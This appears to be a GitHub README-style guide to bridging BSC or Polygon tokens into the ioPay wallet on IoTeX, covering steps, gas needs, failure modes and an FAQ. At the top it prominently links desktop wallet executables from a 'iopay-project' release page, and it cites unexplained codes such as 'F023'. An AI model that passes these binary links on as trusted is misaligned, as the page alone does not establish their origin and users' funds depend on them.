![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Moving BSC or Polygon Tokens Into ioPay Wallet

ioPay Wallet bridges between **IoTeX and Ethereum, BSC and Polygon** (F023). So yes, BSC and Polygon are supported routes - with two conditions that decide whether your token actually moves: the **route must carry that token**, and the destination must have gas.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## Before you start

- **The token exists on the route.** Token lists are per-route and directional. A BEP-20 token on BSC is not automatically available, even if the same project exists on Polygon.
- **Gas on both sides.** BSC or Polygon gas for the source transaction, and a little IOTX on IoTeX for the delivery.
- **The destination address** in the form IoTeX expects - `io1...` or `0x...` for the same account (F019).
- **A small test amount**, if this is the first time you have moved this token.

## The steps

1. **Open the bridge** and set **source: BSC** (or Polygon) and **destination: IoTeX** (F023).
2. **Choose the token from the list the route offers.** If it is not there, the route does not carry it - that is the answer, not a bug.
3. **Enter the amount**, above the route's minimum.
4. **Read the fee and the estimate** before confirming.
5. **Set the destination** to your IoTeX account.
6. **Confirm and sign**, then **watch the status tracker** until the destination side credits (F023).

## What arrives on IoTeX

A **representation**, not native IOTX (F046). That matters immediately if your plan is to stake: only native IOTX stakes. A bridged token can be held, swapped against XRC-20 assets, or bridged onward - but it does not become native by sitting in the wallet.

For the IOTX-on-Ethereum case specifically, the variant problem is bigger: legacy ERC-20 IOTX has its own redemption route, and CIOTX is retired through IIP-56. [Bridging from Ethereum](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/bridging-iotx-from-ethereum-to-iopay.md) covers that properly.

## Failure modes specific to these routes

**Token not carried.** The most common: the route lists major assets, and yours is not among them. Nothing is signed, nothing is lost.

**Destination gas missing.** The transfer completes on the source chain and cannot be delivered. Fund the destination first.

**Wrong address form.** An IoTeX destination is an IoTeX address. Pasting a BSC address into the destination field sends the asset to an address you may not control on IoTeX.

**Wrong chain on the source side.** Bridging from Polygon while the tokens sit on BSC fails at the quote - check which network your wallet is actually connected to.

## If it does not arrive

Work in this order, and do not re-send:

1. **Status tracker** - pending is not failed (F023).
2. **Destination gas** - an undelivered transfer usually has an empty account on the far side.
3. **Destination address** - the right account in the right form?
4. **The source transaction** - is it mined on BSC or Polygon?

[Bridge errors](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/fixing-iotube-swap-errors-in-iopay.md) is the full diagnostic, and [the incident page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/what-iopay-users-should-know-about-the-iotube-incident.md) applies only if the transfer falls in the February-March 2026 window.

## FAQ

**Can I move BSC or Polygon tokens into ioPay Wallet?**
Yes, for tokens the bridge route carries, with gas on both chains and an IoTeX destination address.

**Which tokens are supported?**
Whatever the route lists at the time. This page does not reproduce a list that changes.

**Does a bridged token stake?**
No. Only native IOTX stakes.

**How long does a BSC or Polygon transfer take?**
No fixed time; it depends on source finality, destination congestion and destination gas.

**Can I bridge back out later?**
Yes, on the reverse route, subject to the same conditions.

## Why the token lists differ per route

Each route is a pair of chains with its own contracts and its own liquidity, so a token being carried from Ethereum says nothing about the same token from BSC. The project may exist on both chains under different contracts, and the route may support one and not the other.

That is why "it works for this token on Ethereum" is not evidence about a BSC transfer, and why this page does not reproduce a list. The list is in the interface, it changes, and the only version that matters is the one in front of you at the moment you choose the token.

## What "a representation" means when you want to sell

A bridged token on IoTeX is a claim recorded on IoTeX, not the original asset on its home chain. Held and traded, it behaves like a token; what it does not do is become native IOTX, and it does not entitle you to the original on BSC without a reverse bridge.

Practically: if your plan ends with "sell it for IOTX and stake", the path is bridge in, swap against XRC-20 assets on IoTeX, and accept that staking still requires native IOTX. If your plan ends with "get it back to BSC", the reverse route is the same conditions in the other direction.

## Sizing the test transfer

A test is only useful if it exercises the whole route: the token, the source chain, the destination account, and the destination gas. So make the test small in **value**, not small in **kind** - the same token, the same route, the same address, an amount you would not miss. Then wait for the credit before moving the rest. Two fees is a cheap price for knowing the route works with your address rather than someone else's.

---

*Supported chains follow the v2.0.2 feature set (F023); token variants follow IoTeX documentation (F046); address formats from F019.*
